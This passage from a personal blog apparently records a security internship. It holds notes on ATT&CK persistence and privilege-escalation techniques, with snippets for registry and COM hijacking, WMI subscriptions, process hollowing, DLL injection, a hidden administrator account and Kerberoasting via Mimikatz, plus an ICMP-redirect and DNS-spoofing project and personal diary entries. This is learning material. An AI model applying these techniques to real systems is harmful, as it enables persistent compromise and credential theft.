<li>SeImpersonatePrivilege 濫用（Potato 攻擊）  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立 BITS 作業觸發 SYSTEM 權杖</span></span><br><span class="line"><span class="comment">// 使用 COM 介面攔截 SYSTEM 權杖</span></span><br><span class="line"><span class="comment">// 透過 Named Pipe 或 RPC 進行權杖竊取</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<hr>
<h4 id="3-開機或登入時自動啟動執行-Boot-or-Logon-Autostart-Execution"><a href="#3-開機或登入時自動啟動執行-Boot-or-Logon-Autostart-Execution" class="headerlink" title="3. 開機或登入時自動啟動執行 (Boot or Logon Autostart Execution)"></a>3. 開機或登入時自動啟動執行 (Boot or Logon Autostart Execution)</h4><p>  <strong>常見登錄檔位置：</strong></p>
<table>
<thead>
<tr>
<th>層級</th>
<th>路徑</th>
</tr>
</thead>
<tbody><tr>
<td>系統</td>
<td><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 等</td>
</tr>
<tr>
<td>使用者</td>
<td><code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 等</td>
</tr>
</tbody></table>
<p>  <strong>Winlogon 協助程式機碼：</strong><br>  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line">...（略）</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>  <strong>LSA 安全性套件註冊：</strong><br>  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages</span><br><span class="line">...（略）</span><br></pre></td></tr></tbody></table></figure><br>  <strong>範例：</strong><br>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">SpLsaModeInitialize</span><span class="params">(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)</span> </span>{</span><br><span class="line">    <span class="comment">// 攔截認證資訊</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<hr>
<h4 id="4-建立或修改系統處理程序-Create-or-Modify-System-Process"><a href="#4-建立或修改系統處理程序-Create-or-Modify-System-Process" class="headerlink" title="4. 建立或修改系統處理程序 (Create or Modify System Process)"></a>4. 建立或修改系統處理程序 (Create or Modify System Process)</h4><ul>
<li><strong>Windows 服務建立/劫持</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SC_HANDLE schSCManager = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">SC_HANDLE schService = <span class="built_in">CreateService</span>(schSCManager, <span class="string">L"MaliciousService"</span>, <span class="string">L"Legitimate Service"</span>, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, <span class="string">L"C:\malicious.exe"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">StartService</span>(schService, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>服務 DLL 劫持</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKLM\SYSTEM\CurrentControlSet\Services\[服務名稱]\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "C:\malicious.dll" /f</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>WMI 服務註冊</strong>  <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$service</span> = ([<span class="type">wmiclass</span>]<span class="string">"Win32_BaseService"</span>).CreateInstance()</span><br><span class="line"><span class="variable">$service</span>.Name = <span class="string">"MaliciousWMIService"</span></span><br><span class="line"><span class="variable">$service</span>.DisplayName = <span class="string">"Legitimate WMI Service"</span></span><br><span class="line"><span class="variable">$service</span>.PathName = <span class="string">"C:\malicious.exe"</span></span><br><span class="line"><span class="variable">$service</span>.ServiceType = [<span class="type">uint32</span>]<span class="number">16</span></span><br><span class="line"><span class="variable">$service</span>.StartMode = <span class="string">"Auto"</span></span><br><span class="line"><span class="variable">$service</span>.Put()</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<hr>
<h4 id="5-事件觸發執行-Event-Triggered-Execution"><a href="#5-事件觸發執行-Event-Triggered-Execution" class="headerlink" title="5. 事件觸發執行 (Event Triggered Execution)"></a>5. 事件觸發執行 (Event Triggered Execution)</h4><ul>
<li><strong>WMI 事件訂閱</strong>  <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$EventFilter</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __EventFilter <span class="literal">-NameSpace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>{ Name = <span class="string">"MaliciousFilter"</span>; EventNameSpace = <span class="string">"root\cimv2"</span>; QueryLanguage = <span class="string">"WQL"</span>; Query = <span class="string">"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'notepad.exe'"</span> }</span><br><span class="line"><span class="variable">$EventConsumer</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-NameSpace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>{ Name = <span class="string">"MaliciousConsumer"</span>; CommandLineTemplate = <span class="string">"powershell.exe -enc [Base64編碼的PowerShell命令]"</span> }</span><br><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-NameSpace</span> <span class="string">"root\subscription"</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>{ <span class="keyword">Filter</span> = <span class="variable">$EventFilter</span>; Consumer = <span class="variable">$EventConsumer</span> }</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>預設檔案關聯修改</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.txt\OpenWithProgids" /v "malicious_auto_file" /t REG_NONE /f</span><br><span class="line">reg add "HKCU\Software\Classes\malicious_auto_file\shell\open\command" /ve /t REG_SZ /d "C:\malicious.exe %<span class="number">1</span>" /f</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>螢幕保護程式劫持</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\malicious.scr" /f</span><br><span class="line">reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "<span class="number">1</span>" /f</span><br><span class="line">reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeout" /t REG_SZ /d "<span class="number">60</span>" /f</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>Netsh 協助程式 DLL</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper C:\malicious.dll</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<hr>
<h4 id="6-劫持執行流程-Hijack-Execution-Flow"><a href="#6-劫持執行流程-Hijack-Execution-Flow" class="headerlink" title="6. 劫持執行流程 (Hijack Execution Flow)"></a>6. 劫持執行流程 (Hijack Execution Flow)</h4><ul>
<li><strong>DLL 搜尋順序劫持</strong><ol>
<li>應用程式載入目錄</li>
<li>系統目錄 (System32)</li>
<li>16位元系統目錄 (System)</li>
<li>Windows 目錄</li>
<li>當前目錄</li>
<li>PATH 環境變數目錄</li>
</ol>
</li>
<li><strong>DLL 代理技術</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">"/EXPORT:FunctionName=OriginalDLL.FunctionName,@1"</span>)</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) {</span><br><span class="line">        <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, MaliciousThread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>COM 劫持</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\malicious.dll" /f</span><br><span class="line">reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\malicious.dll" /f</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>COR_PROFILER 劫持</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> COR_ENABLE_PROFILING=<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> COR_PROFILER={CLSID}</span><br><span class="line"><span class="built_in">set</span> COR_PROFILER_PATH=C:\malicious.dll</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>KernelCallbackTable 劫持</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PPEB pPeb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">PVOID* pKernelCallbackTable = (PVOID*)pPeb-&gt;KernelCallbackTable;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(pKernelCallbackTable, <span class="built_in">sizeof</span>(PVOID) * <span class="number">1024</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">pKernelCallbackTable[<span class="number">0</span>] = (PVOID)MaliciousCallback;</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<hr>
<h4 id="7-處理程序注入-Process-Injection"><a href="#7-處理程序注入-Process-Injection" class="headerlink" title="7. 處理程序注入 (Process Injection)"></a>7. 處理程序注入 (Process Injection)</h4><ul>
<li><strong>手動 DLL 對應</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pImageBase = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pImageBase, pDllBuffer, dwImageSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)((DWORD_PTR)pImageBase + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint), <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>反射式 DLL 注入</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HMODULE WINAPI <span class="title">ReflectiveLoader</span><span class="params">(VOID)</span> </span>{</span><br><span class="line">    <span class="comment">// 解析 PE 結構</span></span><br><span class="line">    <span class="comment">// 處理重定位</span></span><br><span class="line">    <span class="comment">// 解析匯入表</span></span><br><span class="line">    <span class="comment">// 呼叫 DLL 主函式</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>進階處理程序挖空</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateProcessW</span>(<span class="literal">NULL</span>, <span class="string">L"svchost.exe"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(pi.hProcess, (LPCVOID)(ctx.Rdx + <span class="number">0x10</span>), &amp;pImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ZwUnmapViewOfSection</span>(pi.hProcess, pImageBase);</span><br><span class="line"><span class="built_in">VirtualAllocEx</span>(pi.hProcess, pImageBase, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, pImageBase, pMaliciousPE, dwImageSize, <span class="literal">NULL</span>);</span><br><span class="line">ctx.Rcx = (DWORD_PTR)pImageBase + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread);</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>Atom Bombing</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATOM atom = <span class="built_in">GlobalAddAtom</span>(<span class="string">L"MaliciousCode"</span>);</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(hWnd, GWLP_USERDATA, atom);</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_GETTEXT, dwCodeSize, (LPARAM)pCodeBuffer);</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>Extra Window Memory 注入</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HWND hWnd = <span class="built_in">CreateWindow</span>(...);</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(hWnd, GWLP_USERDATA, (LONG_PTR)pMaliciousCode);</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_USER, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<hr>
<h4 id="8-排程工作-任務-Scheduled-Task-Job"><a href="#8-排程工作-任務-Scheduled-Task-Job" class="headerlink" title="8. 排程工作/任務 (Scheduled Task/Job)"></a>8. 排程工作/任務 (Scheduled Task/Job)</h4><ul>
<li><strong>COM 介面建立工作</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ITaskService* pService = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">CoCreateInstance</span>(CLSID_TaskScheduler, <span class="literal">NULL</span>, CLSCTX_INPROC_SERVER, IID_ITaskService, (<span class="type">void</span>**)&amp;pService);</span><br><span class="line">pService-&gt;<span class="built_in">Connect</span>(<span class="type">_variant_t</span>(), <span class="type">_variant_t</span>(), <span class="type">_variant_t</span>(), <span class="type">_variant_t</span>());</span><br><span class="line">ITaskDefinition* pTask = <span class="literal">NULL</span>;</span><br><span class="line">pService-&gt;<span class="built_in">NewTask</span>(<span class="number">0</span>, &amp;pTask);</span><br><span class="line"><span class="comment">// 設定觸發器和動作</span></span><br><span class="line"><span class="comment">// 註冊工作</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>隱藏的排程工作</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn "\Microsoft\Windows\MaliciousTask" /tr "C:\malicious.exe" /sc onstart /ru SYSTEM /f</span><br><span class="line">schtasks /create /xml "C:\malicious_task.xml" /tn "HiddenTask"</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>AT 命令（舊版系統）</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> <span class="number">23</span>:<span class="number">59</span> /every:M,T,W,Th,F,S,Su C:\malicious.exe</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<hr>
<h4 id="9-有效帳戶-Valid-Accounts"><a href="#9-有效帳戶-Valid-Accounts" class="headerlink" title="9. 有效帳戶 (Valid Accounts)"></a>9. 有效帳戶 (Valid Accounts)</h4><ul>
<li><strong>本機帳戶操作：建立隱藏管理員帳戶</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ password123 /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators hacker$ /add</span><br><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "hacker$" /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>服務帳戶濫用：Kerberoasting 攻擊</strong>  <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> {ServicePrincipalName <span class="operator">-ne</span> <span class="string">"<span class="variable">$null</span>"</span>} <span class="literal">-Properties</span> ServicePrincipalName</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">"SPN/server.domain.com"</span></span><br><span class="line"><span class="built_in">Invoke-Mimikatz</span> <span class="literal">-Command</span> <span class="string">'"kerberos::list /export"'</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<hr>
<h4 id="10-網域政策修改-Domain-Policy-Modification"><a href="#10-網域政策修改-Domain-Policy-Modification" class="headerlink" title="10. 網域政策修改 (Domain Policy Modification)"></a>10. 網域政策修改 (Domain Policy Modification)</h4><ul>
<li><strong>GPO 修改技術</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpmc.msc</span><br><span class="line">Import-Module GroupPolicy</span><br><span class="line"><span class="built_in">Set</span>-GPRegistryValue -Name "Default Domain Policy" -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ValueName "Malicious" -<span class="built_in">Type</span> String -Value "C:\malicious.exe"</span><br></pre></td></tr></tbody></table></figure></li>
<li><strong>SYSVOL 檔案修改</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 路徑: \\domain.com\SYSVOL\domain.com\Policies\{GPO-GUID}\Machine\Registry.pol</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<hr>
<h4 id="實用工具與命令參考"><a href="#實用工具與命令參考" class="headerlink" title="實用工具與命令參考"></a>實用工具與命令參考</h4><ul>
<li>權限列舉命令  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line">whoami /groups</span><br><span class="line">accesschk.exe -uwcqv "Authenticated Users" *</span><br><span class="line">accesschk.exe -uwcqv "Users" *</span><br><span class="line">accesschk.exe -kqsv HKLM\SYSTEM\CurrentControlSet\Services</span><br><span class="line">wmic service get name,displayname,pathname,startmode | <span class="built_in">findstr</span> /i "auto" | <span class="built_in">findstr</span> /i /v "c:\windows\\" | <span class="built_in">findstr</span> /i /v """"</span><br></pre></td></tr></tbody></table></figure></li>
<li>PowerShell 權限提升腳本  <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</span><br><span class="line"><span class="built_in">Get-CimInstance</span> Win32_StartupCommand | <span class="built_in">Select-Object</span> Name, command, Location, User</span><br><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">Where-Object</span> {<span class="variable">$_</span>.Principal.UserId <span class="operator">-eq</span> <span class="string">"SYSTEM"</span>}</span><br><span class="line"><span class="variable">$env:PATH</span> <span class="operator">-split</span> <span class="string">';'</span> | <span class="built_in">ForEach-Object</span> { <span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="variable">$_</span>) { <span class="built_in">Get-ChildItem</span> <span class="variable">$_</span> <span class="operator">-File</span> <span class="literal">-Filter</span> <span class="string">"*.dll"</span> } }</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
  </details>
  
<ul>
<li>A MITM and Pharming Attacks break down to the framework of ATT&amp;CK<table>
<thead>
<tr>
<th>Tactic</th>
<th>Technique</th>
<th>Project Corr</th>
</tr>
</thead>
<tbody><tr>
<td>Reconnaissance</td>
<td>Active Scanning</td>
<td><strong>Task I: Device Address Information Collection.</strong><br> The initial phase involves actively scanning the local network to identify potential targets by collecting IP and MAC addresses.</td>
</tr>
<tr>
<td>Initial Access</td>
<td>Exploit Public-Facing Application</td>
<td>While not a traditional public-facing application, the Wi-Fi network serves as the entry point.<br> The attack exploits weak configurations that allow for ARP and ICMP manipulation.</td>
</tr>
<tr>
<td>Execution</td>
<td>Inter-Process Communication</td>
<td><strong>Task II &amp; III.</strong> The attacker’s code will interact with the operating system’s networking stack at a low level using raw sockets and Netfilter queues to inject and manipulate traffic.</td>
</tr>
<tr>
<td>Credential Access</td>
<td>Input Capture</td>
<td><strong>Task III: DNS Spoofing.</strong> <br> The ultimate goal of the pharming attack is to present a phishing page to the victim to capture credentials or other sensitive information.</td>
</tr>
<tr>
<td>Lateral Movement / Defense Evasion</td>
<td>Man-in-the-Middle</td>
<td><strong>Task II: ICMP Redirect Attack.</strong> <br> The core of the attack is to position the attacker’s machine between the victim and the gateway by manipulating the victim’s routing table with forged ICMP redirect messages. <br> This intercepts traffic for further exploitation.</td>
</tr>
<tr>
<td>Impact</td>
<td>Defacement</td>
<td><strong>Task III: DNS Spoofing</strong>. By redirecting the user to a phishing page, the attacker is effectively defacing the intended website from the victim’s perspective.</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>Today’s achievements:</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Read “Privilege Escalation” tatics and related techniques in ATT&amp;CK framework</li>
<li>[] 實作ICMP Redirect Attack <strong>未成功</strong><ul>
<li>在Command 下 python icmp_redirect.py “#{remote.device.ip}” “agent.ip”(<strong>agent.ip會抓不到</strong>)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Day-6"><a href="#Day-6" class="headerlink" title="Day 6"></a>Day 6</h3><details>
<summary>昨天放颱風假</summary>

<blockquote>
<p>被探班，吃了家常的豬肉拌麵<br>咖啡外交官，學長姐很喜歡手沖咖啡</p>
</blockquote>
</details>

<ul>
<li><p>Note of today</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://feifei.tw/attck-techniques-analyze/">ATT&amp;CK 36個 Techniques 分析</a></li>
<li><a target="_blank" rel="noopener" href="https://hacksplaining.com/prevention/sql-injection">SQL injection</a></li>
</ul>
</li>
<li><p>Todat’s Achievements:</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> VM network setting restart: 不知道為甚麼NAT network為自己掛掉，要重新把windows 裡面的network service restart </li>
<li><input checked="" disabled="" type="checkbox"> implement some abilities in Caldera<br>  - Enable Guest RDP Access (<strong>T1078.001</strong>): 需要先獲得系統管理員權限才能執行<br>  - External Remote Services(<strong>T1133</strong>): 需要extension_id </li>
<li><input checked="" disabled="" type="checkbox"> 寫了一個discovery ability用來列出同個網段中有相同default gateway的IP<ul>
<li>這個IP會被用來做ICMP Redirect Attack</li>
<li>如果要用caldera server做ability之間的溝通，必須要自訂義paraser</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> ICMP_redirect.py: 實作ICMP Redirect Attack<ul>
<li>這個攻擊會在victim的路由表中加入一條指向attacker的路由</li>
<li>使得victim要做DNS查詢時會先發送到attacker</li>
</ul>
</li>
</ul>
</li>
<li><p>TODO:</p>
<ul>
<li><strong>7/10</strong> 要報告這兩個禮拜做了甚麼</li>
<li><strong>7/9</strong> 閱讀並實作<a target="_blank" rel="noopener" href="https://feifei.tw/attck-techniques-analyze/">ATT&amp;CK 36個 Techniques 分析</a></li>
<li><strong>7/9</strong> 整理這兩個禮拜做了甚麼</li>
</ul>
</li>
</ul>
<hr>
<h2 id="上班之餘"><a href="#上班之餘" class="headerlink" title="上班之餘"></a>上班之餘</h2><h3 id="中研咖啡所"><a href="#中研咖啡所" class="headerlink" title="中研咖啡所"></a>中研咖啡所</h3><p>害我<a href="#day-2">DAY 2</a>遲到的咖啡店，手沖超好喝，憑證還可以九折<br>目前喝了:</p>
<ol>
<li>肯亞 AA 冰<br> 目測老闆是沖三段(不含悶蒸)，每段的水流的偏細，所以雖然是冰的但依然有濃厚的香氣與清楚的酸甜調，AA特有的烏梅也表現得很明顯</li>
</ol>
<h3 id="五吉郎"><a href="#五吉郎" class="headerlink" title="五吉郎"></a>五吉郎</h3><p>門口外面的早餐店，高級板比斯多，炒泡麵還不錯吃<br>可以先用網路點餐再取，非常適合快遲到的人</p>
<hr>
<h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://withoutdirection.github.io">烏鴉先生</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://withoutdirection.github.io/2025/07/01/sinica-cs-summer-internship/">http://withoutdirection.github.io/2025/07/01/sinica-cs-summer-internship/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8/">電腦安全</a><a class="post-meta__tags" href="/tags/%E5%AF%A6%E7%BF%92/">實習</a></div><div class="post-share"><div class="social-share" data-image="/img/crow.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script 